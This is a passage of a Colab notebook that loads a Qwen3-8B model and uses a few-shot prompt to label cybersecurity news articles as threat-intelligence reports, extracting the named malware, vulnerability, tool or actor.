            "ca944cb33e5845a2b793b676bfde5c77",
            "7e51359838c34393a77771a13035be83",
            "464e492ab874427f83eb8c572e7fe6de",
            "4059d0e2276142feab51494d3cecebf1",
            "2086aae2292c4a74ad4738dc096bd478",
            "30f101c6a8b84a06a2f041a8b04601c9",
            "08c4c18fa0114519afdc57ce7d0fb55c",
            "ab7c71bb937f43f4aac2937ac662c701",
            "6e020992eecf4992a3d09996351f72e7",
            "00bb7f6935924442b28f4615fe6b06a2",
            "c260d30cecd54b5ab09d73a62691b797",
            "676aaa0b8227482cb0d7ccbe341e67e6",
            "a85d70ed58424986a3210994754810bf",
            "52186c5352864b3788f007e47ed3f52b",
            "af75f8d7fbfb47dc9c02e3bcaacced56",
            "9217447508564f11afe2efefa257165b",
            "2f95561ae8ae463dbb96dd06c54617b9",
            "12fa676fc3ef43a79fc8dea37326d17a",
            "5d823dda82354ba8aa58cc59c4768dc8",
            "5381a8da72b94bb2a1523525805ce8bc",
            "4c0920207d3d42f4a8fd8e1fe3e50f13",
            "5d06c490324e4412a98a35ef0f59e6ca",
            "eb34f767d0824c479b28872d03687ad5",
            "aeda9f2d2a8a4937b02d08fabaef0698",
            "b5fd71b699d348498197bf682cfa4818",
            "ec97ff2cd2074d87bc7e263c6e750f57",
            "c5d4e576a22640dc9f57e6306a174e2c",
            "c72ddf5f9715468ba80a7a631decc215",
            "69dfcaf176a1433bb5687029e5813869",
            "9eba94c2e05c491aa550d410ba21e937",
            "ec352e512e8b49af872753719f0de91f",
            "34b324f718fc4f7089e8e35c7bf098a4",
            "b5f3f5b25f974fd680bc2c831e62a25f",
            "2c128947c72b44e8a70f0c9e917c69f0",
            "2eaccbc3e73240cc8c8830e8a49c6b13",
            "64ea50da792642d987b42d1308af5eea",
            "7bfb644fef0f4a538fd24a28650f4006",
            "2162203764224a4fa35624e2916b871d",
            "988908c02860422485c3af35eecd6aff",
            "60cb7d6e623a4589b9f239a895d1300b",
            "863eacba8381449abb879f0dd62f8922",
            "848f0d504550430cb6f9bef3a5e8fd22",
            "8461d52907644573bc3ea6b101b496e1",
            "248fbc260ce544daba814d94f72cb37b",
            "b49d28ff61ae4932a41943c460172f22",
            "f1b33cc212e84ad7842bdaec83a3109d",
            "ba6d074cf985487c92992885d2de1908",
            "418db6c722564a5cad1cba85b485073e",
            "4c51ec3ca8124e4282839642ff06adab",
            "c4d3cbf119b44483a7d47c95eb30f87e",
            "9ea24533e7534e5590f624eebe0e1f82",
            "400b556973e149bdb10fa90cfdb9b12a",
            "ecaa8b7ff0504a79be4ec1832f78c2d9",
            "34a92a4cf794416ab5501e16966a9488",
            "a074f26fcb9b40b49ca8d043df979a7d",
            "adb9c1aa3baf4f27819f0e83259fff45",
            "2c46844b7d234fa2a709e027d5a91372",
            "7b77234f11af4f3b9e838ab17723be2f",
            "c679004282f74b70bb84dfc5b122a821",
            "75c6b7c4bf764b25b44c0c075c880ad4",
            "56fb27f2ab0a4f1e9d6aa8e52382eba3",
            "78f658e9617f4fd6ae49a654ba0f6968",
            "5ce8ab88b5fe4908a77a42ebf708e966",
            "c34c58debf924288a938ce2278d5c7fe",
            "9f137612a9724245a73d201883afbd8e",
            "37948a2d7bd645a78dc7a88f44a73ed9",
            "09507f41b8d94d1ea48b13c4c3e35a31",
            "c49970267f284ed6b968044662527b71",
            "a7709502745347b697427a54102e9d16",
            "4e2021d396e340a2812e05c1cd38d09f",
            "ef8a9c65e5db4559b5f9c516c5fea87a",
            "74b5f1d3795a4698b963241b0f8f5091",
            "3dadcdb069174df3961d8a1dc6498b6d",
            "ae5e8460b2cd410caf01295315672c97",
            "dcf335ffef954e9dabaf3d1254636044",
            "ba0045b3968d4da3b53456522a6ba6ef",
            "921a0ac037c141508afb5b32bb321b07",
            "734952231f1b42b5936c6ea8ff7c6061",
            "1ca7b3097dd3440a88bfed2396d7eac0",
            "de6a5378958c42c9bd4ac27588824dfd",
            "66b394e4f7f94f3c89920747ba399caa",
            "e39ad37d07a249be9b28ac31c3ec02dc",
            "fcf77173426448359afa262bf551d282",
            "b6b57166e2d04aa19dc0cf56bf7e0005",
            "0ee46cc9cdbf4ba88b9f1a4eb9cb4ea9",
            "0bd89a7cf2f948b781c3075ee80fc339",
            "24d778e1df914cd89bd2a884a54cfb38",
            "63f783ebaf6d4a34be7709978fb901a7",
            "19281b9e75d0413e801cdfb087d61b27",
            "ae93ae9686f94de1b7c9afecd7bf4e72",
            "507123fc2446446f8036b352f3b4daa8",
            "ff78da02a8174d6f8853e72720579da3",
            "3d29d415223140e1a15c166f06d09c8c",
            "65f68fb0a7724c588366bda0e4d53c71",
            "4035534dc9ad4e3db88c06473dc31cf9",
            "7251a2f6727d468699d05aaa8f4afb6f",
            "d6730e58c2934dae9aed4826c292b089",
            "af1eb737b53c44dc85a21b67ca532930",
            "184ca6caa03b487c972e1fc7553a273a",
            "e3a0560c90f54e81989badbd5250f448",
            "d7e4e667f5f845889393357dcc13ae8b",
            "b54537fd46e34064815301870e562516",
            "12e11d8794844c5ab41eaac773c6e123",
            "28e4a9f606be413a99f4cff894e750a0",
            "b830c89f4de642d3ac0715b2d5c776e1",
            "37b88d65af1943ebbcfc3142a19c8926",
            "8a404e3cc2f041e6aa35251c868da2bd",
            "c82208c24e314cb888a14a06ff25b8aa",
            "f85481ca6e99401ab58941b87b02b680",
            "9a6ec1b3925e4ac4a2313301d4ee792e"
          ]
        },
        "id": "71c845a3",
        "outputId": "5686808d-5d3c-4e4c-9e7a-10f747b7c796"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "🤖 Đang tải mô hình: unsloth/Qwen3-8B\n",
            "📱 Thiết bị: CUDA\n",
            "🔑 Token: ✅ Found\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer_config.json: 0.00B [00:00, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "3ef531275f204cc5a1479462f421a013"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "vocab.json: 0.00B [00:00, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "b89a598d131948e2a25600adfa323f02"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "merges.txt: 0.00B [00:00, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "73ad305807984e3ba23191e5f96b3630"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer.json:   0%|          | 0.00/11.4M [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "68d6f4c2c3384d1984a3d84ca9bd8e15"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "added_tokens.json:   0%|          | 0.00/707 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "460bf46c905946f39f87fcd6c5522e7a"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "special_tokens_map.json:   0%|          | 0.00/614 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "0ea81c6c471347a58debc76aca796e62"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "chat_template.jinja: 0.00B [00:00, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "ca944cb33e5845a2b793b676bfde5c77"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config.json:   0%|          | 0.00/754 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "676aaa0b8227482cb0d7ccbe341e67e6"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "model.safetensors.index.json: 0.00B [00:00, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "eb34f767d0824c479b28872d03687ad5"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "Fetching 4 files:   0%|          | 0/4 [00:00<?, ?it/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "2c128947c72b44e8a70f0c9e917c69f0"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "model-00004-of-00004.safetensors:   0%|          | 0.00/1.58G [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "b49d28ff61ae4932a41943c460172f22"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "model-00001-of-00004.safetensors:   0%|          | 0.00/4.90G [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "adb9c1aa3baf4f27819f0e83259fff45"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "model-00002-of-00004.safetensors:   0%|          | 0.00/4.92G [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "09507f41b8d94d1ea48b13c4c3e35a31"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "model-00003-of-00004.safetensors:   0%|          | 0.00/4.98G [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "734952231f1b42b5936c6ea8ff7c6061"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "Loading checkpoint shards:   0%|          | 0/4 [00:00<?, ?it/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "19281b9e75d0413e801cdfb087d61b27"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "generation_config.json:   0%|          | 0.00/237 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "e3a0560c90f54e81989badbd5250f448"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "Device set to use cuda:0\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "✅ Đã tải thành công unsloth/Qwen3-8B trên CUDA\n"
          ]
        }
      ],
      "source": [
        "import torch\n",
        "import os\n",
        "from dotenv import load_dotenv\n",
        "from transformers import AutoTokenizer, AutoModelForCausalLM, pipeline\n",
        "\n",
        "from google.colab import userdata\n",
        "\n",
        "\n",
        "# Load environment variables\n",
        "# load_dotenv()\n",
        "\n",
        "# Get configuration from environment\n",
        "HF_TOKEN = userdata.get('HF_TOKEN') or None\n",
        "DEFAULT_MODEL = userdata.get('DEFAULT_MODEL')\n",
        "FALLBACK_MODEL = userdata.get('FALLBACK_MODEL')\n",
        "\n",
        "if not HF_TOKEN:\n",
        "    print(\"⚠️  Warning: HF_TOKEN not found in .env file\")\n",
        "    print(\"   Create .env file with: HF_TOKEN=your_token_here\")\n",
        "\n",
        "# Thiết lập device tự động\n",
        "device = (\n",
        "    \"cuda\" if torch.cuda.is_available()\n",
        "    else \"mps\" if torch.backends.mps.is_available()\n",
        "    else \"cpu\"\n",
        ")\n",
        "\n",
        "def setup_model(model_name: str = None, hf_token: str = HF_TOKEN):\n",
        "    \"\"\"\n",
        "    Tải model từ Hugging Face với token từ environment variables.\n",
        "    \"\"\"\n",
        "\n",
        "\n",
        "    print(f\"🤖 Đang tải mô hình: {model_name}\")\n",
        "    print(f\"📱 Thiết bị: {device.upper()}\")\n",
        "    print(f\"🔑 Token: {'✅ Found' if hf_token else '❌ Missing'}\")\n",
        "\n",
        "    try:\n",
        "        # Load tokenizer\n",
        "        tokenizer = AutoTokenizer.from_pretrained(\n",
        "            model_name,\n",
        "            token=hf_token,\n",
        "            trust_remote_code=True\n",
        "        )\n",
        "        tokenizer.pad_token = tokenizer.pad_token or tokenizer.eos_token\n",
        "\n",
        "        # Thiết lập kiểu dữ liệu và bản đồ thiết bị\n",
        "        torch_dtype = torch.float16 if device == \"cuda\" else torch.float32\n",
        "        device_map = \"auto\" if device == \"cuda\" else None\n",
        "\n",
        "        # Load model\n",
        "        model = AutoModelForCausalLM.from_pretrained(\n",
        "            model_name,\n",
        "            token=hf_token,\n",
        "            trust_remote_code=True,\n",
        "            torch_dtype=torch_dtype,\n",
        "            device_map=device_map,\n",
        "            use_cache=False\n",
        "        )\n",
        "\n",
        "        if device_map is None and device in [\"mps\", \"cuda\"]:\n",
        "            model.to(device)\n",
        "\n",
        "        if device_map is None:\n",
        "            # Nếu không sử dụng device_map=\"auto\", có thể chỉ định device\n",
        "            pipe = pipeline(\n",
        "                \"text-generation\",\n",
        "                model=model,\n",
        "                tokenizer=tokenizer,\n",
        "                device=0 if device != \"cpu\" else -1,\n",
        "                torch_dtype=torch_dtype,\n",
        "                model_kwargs={\"use_cache\": False}\n",
        "            )\n",
        "        else:\n",
        "            # Nếu sử dụng device_map=\"auto\", không chỉ định device\n",
        "            pipe = pipeline(\n",
        "                \"text-generation\",\n",
        "                model=model,\n",
        "                tokenizer=tokenizer,\n",
        "                torch_dtype=torch_dtype,\n",
        "                model_kwargs={\"use_cache\": False}\n",
        "            )\n",
        "\n",
        "        print(f\"✅ Đã tải thành công {model_name} trên {device.upper()}\")\n",
        "        return pipe\n",
        "\n",
        "    except Exception as e:\n",
        "        print(f\"❌ Lỗi khi tải {model_name}: {e}\")\n",
        "        return setup_fallback_model(hf_token)\n",
        "\n",
        "\n",
        "def setup_fallback_model(hf_token: str = HF_TOKEN):\n",
        "    \"\"\"\n",
        "    Tải fallback model nếu model chính lỗi.\n",
        "    \"\"\"\n",
        "    fallback_name = FALLBACK_MODEL\n",
        "\n",
        "    print(f\"🔄 Đang tải mô hình dự phòng: {fallback_name}\")\n",
        "\n",
        "    try:\n",
        "        tokenizer = AutoTokenizer.from_pretrained(fallback_name, token=hf_token)\n",
        "        tokenizer.pad_token = tokenizer.pad_token or tokenizer.eos_token\n",
        "\n",
        "        model = AutoModelForCausalLM.from_pretrained(\n",
        "            fallback_name,\n",
        "            token=hf_token,\n",
        "            torch_dtype=torch.float32,\n",
        "            use_cache=False\n",
        "        )\n",
        "\n",
        "        if device in [\"cuda\", \"mps\"]:\n",
        "            model.to(device)\n",
        "\n",
        "        pipe = pipeline(\n",
        "            \"text-generation\",\n",
        "            model=model,\n",
        "            tokenizer=tokenizer,\n",
        "            device=0 if device != \"cpu\" else -1,\n",
        "            model_kwargs={\"use_cache\": False}\n",
        "        )\n",
        "\n",
        "        print(f\"✅ {FALLBACK_MODEL} đã sẵn sàng trên {device.upper()}\")\n",
        "        return pipe\n",
        "\n",
        "    except Exception as e:\n",
        "        print(f\"❌ Lỗi khi tải {FALLBACK_MODEL} fallback: {e}\")\n",
        "        return None\n",
        "\n",
        "\n",
        "# Load model with environment token\n",
        "model = setup_model(FALLBACK_MODEL)\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "6214e0ad",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 145
        },
        "id": "6214e0ad",
        "outputId": "0554415f-fb37-4ae2-abee-ffd2760b215c"
      },
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "\"Determine if this is a threat intelligence related to cyberattacks, vulnerability exploits, malware, etc. based on the input. Please output 'yes' or 'no' and, if yes, output the object of the input on the next line in the format: [Entity Type]: [Name], where [Entity Type] is one of Malware, Vulnerability, Tool, Technique, or Actor, and [Name] is the specific threat name or identifier.\\n\\n    EXAMPLES:\\n    INPUT: Lancefly: Group Uses Custom Backdoor to Target Orgs in Government, Aviation, Other Sectors. Merdoor backdoor is low prevalence and used in highly targeted attacks. Lancefly’s custom malware, which we have dubbed Merdoor, is a powerful backdoor that appears to have existed since 2018.\\n    OUTPUT: yes\\n    Malware: Merdoor\\n\\n    INPUT: A smorgasbord for June’s Patch Tuesday. Between its own fixes and a slew of FYI alerts covering Edge, GitHub, and Autodesk, Microsoft piles 94 CVEs onto sysadmins’ plates; Fortinet and Adobe also at the table.\\n    OUTPUT: no\\n\\n    INPUT: APT28 Deploys New Malware Zebrocy. The APT28 group has been observed using a new malware called Zebrocy to target government institutions.\\n    OUTPUT: yes\\n    Malware: Zebrocy\\n\\n    INPUT: New Vulnerability in Apache Server. A critical vulnerability CVE-2023-1234 in Apache Server allows remote code execution.\\n    OUTPUT: yes\\n    Vulnerability: CVE-2023-1234\\n\\n    INPUT: PowerShell Used in Recent Attacks. Attackers are leveraging PowerShell to execute malicious scripts.\\n    OUTPUT: yes\\n    Tool: PowerShell\\n\\n    INPUT: Improving Cloud Intrusion Detection and Triage with FortiCNAPP Composite Alerts. FortiCNAPP helps detect intrusions in cloud environments.\\n    OUTPUT: yes\\n    Tool: FortiCNAPP\\n\\n    INPUT: Emotet Returns with New Techniques. Emotet malware has re-emerged using advanced phishing techniques.\\n    OUTPUT: yes\\n    Malware: Emotet\\n\\n    INPUT: Log4Shell Vulnerability Exploited. The Log4Shell vulnerability CVE-2021-44228 is actively exploited in the wild.\\n    OUTPUT: yes\\n    Vulnerability: CVE-2021-44228\\n\\n    INPUT: Cobalt Strike Used in Targeted Attacks. The Cobalt Strike framework is being deployed by attackers.\\n    OUTPUT: yes\\n    Tool: Cobalt Strike\\n\\n    INPUT: Lazarus Group Targets Crypto Firms. The Lazarus Group, a North Korean APT, has launched new campaigns.\\n    OUTPUT: yes\\n    Actor: Lazarus Group\\n\\n    INPUT: FortiGuard Labs Threat Research FortiGuard Labs analyzes NailaoLocker ransomware, a unique variant using SM2 encryption and a built-in decryption function. Learn how it works, why it matters, and how Fortinet protects against it. ByKuan-Yen LiuandYen-Ting LeeJuly 18, 2025 FortiGuard Labs Threat Research FortiCNAPP Composite Alerts link weak signals into clear timelines—helping security teams detect cloud-native threats earlier and triage them faster. ByDavid AdamsonJuly 17, 2025 FortiGuard Labs Threat Research FortiCNAPP Labs uncovers Lcrypt0rx, a likely AI-generated ransomware variant used in updated H2Miner campaigns targeting cloud resources for Monero mining. ByAkshat PradhanJuly 16, 2025 FortiGuard Labs Threat Research Discover how FortiSandbox 5.0 detects Dark 101 ransomware, even with sandbox evasion tactics. Learn how advanced behavioral analysis blocks file encryption, system tampering, and ransom note deployment. ByBryan LuJuly 14, 2025 FortiGuard Labs Threat Research Explore how AI is changing the cat-and-mouse dynamic of cybersecurity, from cracking obfuscation and legacy languages to challenging new malware built with Flutter, Rust, and Delphi. ByAxelle ApvrilleJuly 10, 2025 FortiGuard Labs Threat Research FortiGuard Labs explores how NordDragonScan utilizes an effective distribution network for dissemination. Learn more. ByCara LinJuly 07, 2025 FortiGuard Labs Threat Research FortiGuard Labs analyzes RondoDox, a stealthy new botnet targeting TBK DVRs and Four-Faith routers via CVE-2024-3721 and CVE-2024-12856. Learn how it evades detection, establishes persistence, and mimics gaming and VPN traffic to launch DDoS attacks. ByVincent LiJuly 03, 2025 FortiGuard Labs Threat Research Threat actor impersonates Colombian government to deliver DCRAT via phishing email, using obfuscation, steganography, and PowerShell payload chains. ByAriel LitvakJuly 01, 2025 FortiGuard Labs Threat Research Explore a detailed technical analysis of a Havoc Remote Access Trojan\\n    OUTPUT:\""
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            }
          },
          "metadata": {},
          "execution_count": 5
        }
      ],
      "source": [
        "def create_prompt(title: str, content: str) -> str:\n",
        "    \"\"\"\n",
        "    Create a prompt for threat intelligence classification with enhanced few-shot learning.\n",
        "    \"\"\"\n",
        "    # Truncate content to 2000 characters\n",
        "    content_truncated = (content[:2000] if content else \"\").replace('\\n', ' ')\n",
        "\n",
        "    prompt = f\"\"\"Determine if this is a threat intelligence related to cyberattacks, vulnerability exploits, malware, etc. based on the input. Please output 'yes' or 'no' and, if yes, output the object of the input on the next line in the format: [Entity Type]: [Name], where [Entity Type] is one of Malware, Vulnerability, Tool, Technique, or Actor, and [Name] is the specific threat name or identifier.\n",
        "\n",
        "    EXAMPLES:\n",
        "    INPUT: Lancefly: Group Uses Custom Backdoor to Target Orgs in Government, Aviation, Other Sectors. Merdoor backdoor is low prevalence and used in highly targeted attacks. Lancefly’s custom malware, which we have dubbed Merdoor, is a powerful backdoor that appears to have existed since 2018.\n",
        "    OUTPUT: yes\n",
        "    Malware: Merdoor\n",
        "\n",
        "    INPUT: A smorgasbord for June’s Patch Tuesday. Between its own fixes and a slew of FYI alerts covering Edge, GitHub, and Autodesk, Microsoft piles 94 CVEs onto sysadmins’ plates; Fortinet and Adobe also at the table.\n",
        "    OUTPUT: no\n",
        "\n",
        "    INPUT: APT28 Deploys New Malware Zebrocy. The APT28 group has been observed using a new malware called Zebrocy to target government institutions.\n",
        "    OUTPUT: yes\n",
        "    Malware: Zebrocy\n",
        "\n",
        "    INPUT: New Vulnerability in Apache Server. A critical vulnerability CVE-2023-1234 in Apache Server allows remote code execution.\n",
        "    OUTPUT: yes\n",
        "    Vulnerability: CVE-2023-1234\n",
        "\n",
        "    INPUT: PowerShell Used in Recent Attacks. Attackers are leveraging PowerShell to execute malicious scripts.\n",
        "    OUTPUT: yes\n",
        "    Tool: PowerShell\n",
        "\n",
        "    INPUT: Improving Cloud Intrusion Detection and Triage with FortiCNAPP Composite Alerts. FortiCNAPP helps detect intrusions in cloud environments.\n",
        "    OUTPUT: yes\n",
        "    Tool: FortiCNAPP\n",
        "\n",
        "    INPUT: Emotet Returns with New Techniques. Emotet malware has re-emerged using advanced phishing techniques.\n",
        "    OUTPUT: yes\n",
        "    Malware: Emotet\n",
        "\n",
        "    INPUT: Log4Shell Vulnerability Exploited. The Log4Shell vulnerability CVE-2021-44228 is actively exploited in the wild.\n",
        "    OUTPUT: yes\n",
        "    Vulnerability: CVE-2021-44228\n",
        "\n",
        "    INPUT: Cobalt Strike Used in Targeted Attacks. The Cobalt Strike framework is being deployed by attackers.\n",
        "    OUTPUT: yes\n",
        "    Tool: Cobalt Strike\n",
        "\n",
        "    INPUT: Lazarus Group Targets Crypto Firms. The Lazarus Group, a North Korean APT, has launched new campaigns.\n",
        "    OUTPUT: yes\n",
        "    Actor: Lazarus Group\n",
        "\n",
        "    INPUT: {content_truncated}\n",
        "    OUTPUT:\"\"\"\n",
        "\n",
        "    return prompt\n",
        "create_prompt(data[0]['title'], data[0]['content'])"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "ea397212",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "ea397212",
        "outputId": "dca6802b-ec95-4fa7-a4ed-7b5562162245"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: NailaoLocker\n",
            "{'is_threat_report': True, 'main_object': 'Malware: NailaoLocker'}\n"
          ]
        }
      ],
      "source": [
        "def classify_article(pipe, title: str, content: str) -> dict:\n",
        "    \"\"\"\n",
        "    Classify a single article using the model with improved output parsing.\n",
        "    \"\"\"\n",
        "    try:\n",
        "        prompt = create_prompt(title, content)\n",
        "\n",
        "        # Generate response\n",
        "        response = pipe(\n",
        "            prompt,\n",
        "            max_new_tokens=200,\n",
        "            do_sample=False,\n",
        "            pad_token_id=pipe.tokenizer.eos_token_id,\n",
        "        )\n",
        "\n",
        "        # Extract the generated text (remove the prompt)\n",
        "        generated_text = response[0]['generated_text']\n",
        "        answer = generated_text[len(prompt):].strip()\n",
        "\n",
        "        # Parse the response\n",
        "        lines = [line.strip() for line in answer.splitlines() if line.strip()]\n",
        "\n",
        "        # Determine if it's a threat report\n",
        "        is_threat = False\n",
        "        main_object = \"\"\n",
        "\n",
        "        if lines:\n",
        "            first_line = lines[0].lower().strip()\n",
        "            is_threat = any(yes_word in first_line for yes_word in [\"yes\", \"true\", \"1\"])\n",
        "\n",
        "            # Extract main object from the response\n",
        "            if is_threat and len(lines) > 1:\n",
        "                # Look for the object in the next line after \"yes\"\n",
        "                for i in range(1, len(lines)):\n",
        "                    line = lines[i].strip()\n",
        "                    if line and \":\" in line and not line.startswith(\"output:\") and not line.startswith(\"input:\"):\n",
        "                        # Assume the line contains [Entity Type]: [Name]\n",
        "                        main_object = line\n",
        "                        break\n",
        "                if not main_object:\n",
        "                    # If no object found in next line, check if it's combined with \"yes\" in first line\n",
        "                    parts = first_line.split()\n",
        "                    for part in parts:\n",
        "                        if \":\" in part:\n",
        "                            main_object = part\n",
        "                            break\n",
        "\n",
        "            print(f'Is threat: {is_threat}\\tMain object: {main_object}')\n",
        "\n",
        "        return {\n",
        "            \"is_threat_report\": is_threat,\n",
        "            \"main_object\": main_object\n",
        "        }\n",
        "\n",
        "    except Exception as e:\n",
        "        print(f\"❌ Error classifying article '{title[:50]}...': {e}\")\n",
        "        return {\n",
        "            \"is_threat_report\": False,\n",
        "            \"main_object\": \"\"\n",
        "        }\n",
        "\n",
        "# test_classify_first_record = classify_article(gpt2, data[0]['title'], data[0]['content'])\n",
        "\n",
        "test_classify_first_record = classify_article(model, data[1]['title'], data[1]['content'])\n",
        "print(test_classify_first_record)"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "bdf7afa7",
      "metadata": {
        "id": "bdf7afa7"
      },
      "outputs": [],
      "source": [
        "def process_data(data: list, pipe: pipeline, classify_fn: callable = classify_article) -> list:\n",
        "    \"\"\"\n",
        "    Process all articles in the dataset.\n",
        "    \"\"\"\n",
        "    print(f\"🔍 Processing {len(data)} articles...\")\n",
        "\n",
        "    results = []\n",
        "\n",
        "    for i, item in enumerate(data):\n",
        "        print(f\"Processing {i+1}/{len(data)}: {item.get('title', 'Unknown')[:50]}...\")\n",
        "\n",
        "        title = item.get('title', '')\n",
        "        link = item.get('link', '')\n",
        "        content = item.get('content', '')\n",
        "\n",
        "        # Classify the article\n",
        "        classification = classify_fn(pipe, title, content)\n",
        "\n",
        "        # Create result object\n",
        "        result = {\n",
        "            \"title\": title,\n",
        "            \"content\": content,\n",
        "            \"link\": link,\n",
        "            \"is_threat_report\": classification[\"is_threat_report\"],\n",
        "            \"main_object\": classification[\"main_object\"]\n",
        "        }\n",
        "\n",
        "        results.append(result)\n",
        "\n",
        "        # Print progress every 10 items\n",
        "        if (i + 1) % 10 == 0:\n",
        "            print(f\"  Processed {i+1}/{len(data)} articles\")\n",
        "\n",
        "    return results\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "id": "fb85844e",
      "metadata": {
        "id": "fb85844e"
      },
      "outputs": [],
      "source": [
        "def save_results(results: list, output_file: str = \"classified.json\"):\n",
        "    \"\"\"\n",
        "    Save classification results to JSON file with automatic directory creation.\n",
        "    \"\"\"\n",
        "    try:\n",
        "        # Create directory if it doesn't exist\n",
        "        output_path = Path(output_file)\n",
        "        output_path.parent.mkdir(parents=True, exist_ok=True)\n",
        "\n",
        "        # Convert to absolute path to avoid relative path issues\n",
        "        absolute_path = output_path.resolve()\n",
        "\n",
        "        print(f\"💾 Saving to: {absolute_path}\")\n",
        "\n",
        "        with open(absolute_path, 'w', encoding='utf-8') as f:\n",
        "            json.dump(results, f, ensure_ascii=False, indent=2)\n",
        "\n",
        "        print(f\"✅ Successfully saved results to {output_file}\")\n",
        "\n",
        "        # Print statistics\n",
        "        threat_reports = sum(1 for r in results if r['is_threat_report'])\n",
        "        non_threat_reports = len(results) - threat_reports\n",
        "\n",
        "        print(f\"\\n📊 CLASSIFICATION STATISTICS:\")\n",
        "        print(f\"Total articles: {len(results)}\")\n",
        "        print(f\"Threat reports: {threat_reports}\")\n",
        "        print(f\"Non-threat reports: {non_threat_reports}\")\n",
        "        print(f\"Threat report percentage: {(threat_reports/len(results)*100):.1f}%\")\n",
        "\n",
        "        # Show some examples of threat reports\n",
        "        threat_examples = [r for r in results if r['is_threat_report']][:5]\n",
        "        if threat_examples:\n",
        "            print(f\"\\n🔍 SAMPLE THREAT REPORTS:\")\n",
        "            for i, example in enumerate(threat_examples, 1):\n",
        "                print(f\"  {i}. {example['title'][:60]}...\")\n",
        "                print(f\"     Main object: {example['main_object']}\")\n",
        "\n",
        "    except Exception as e:\n",
        "        print(f\"❌ Error saving results: {e}\")\n",
        "        print(f\"   Attempted path: {output_file}\")\n",
        "        print(f\"   Current working directory: {os.getcwd()}\")\n",
        "        print(f\"   Absolute path would be: {Path(output_file).resolve()}\")"
      ]
    },
    {
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "cbcc52a4b25e93a6",
        "outputId": "c6d23585-5d79-4004-cc7d-4d07273d90f8"
      },
      "cell_type": "code",
      "outputs": [
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
